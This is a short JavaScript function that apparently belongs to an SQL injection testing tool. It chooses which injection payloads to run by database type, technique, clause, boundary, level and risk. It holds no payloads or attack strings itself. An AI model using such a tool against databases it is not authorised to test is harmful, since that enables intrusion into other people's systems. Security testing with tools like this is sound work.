export function selectPayloadsForCtx(ctx = {}, extra = {}) {
  const cfg = ctx.config || {};
  return selectPayloads({
    dbms: extra.dbms ?? ctx.dbms,
    technique: extra.technique ?? ctx.technique,
    level: extra.level ?? (Number(cfg.level) > 0 ? Number(cfg.level) : undefined),
    risk: extra.risk ?? (Number(cfg.risk) > 0 ? Number(cfg.risk) : undefined),
    clause: extra.clause,
    boundary: extra.boundary,
    dbmsVersion: extra.dbmsVersion ?? ctx.dbmsVersion,
    testFilter: extra.testFilter ?? cfg.testFilter,
    testSkip: extra.testSkip ?? cfg.testSkip,
  });
}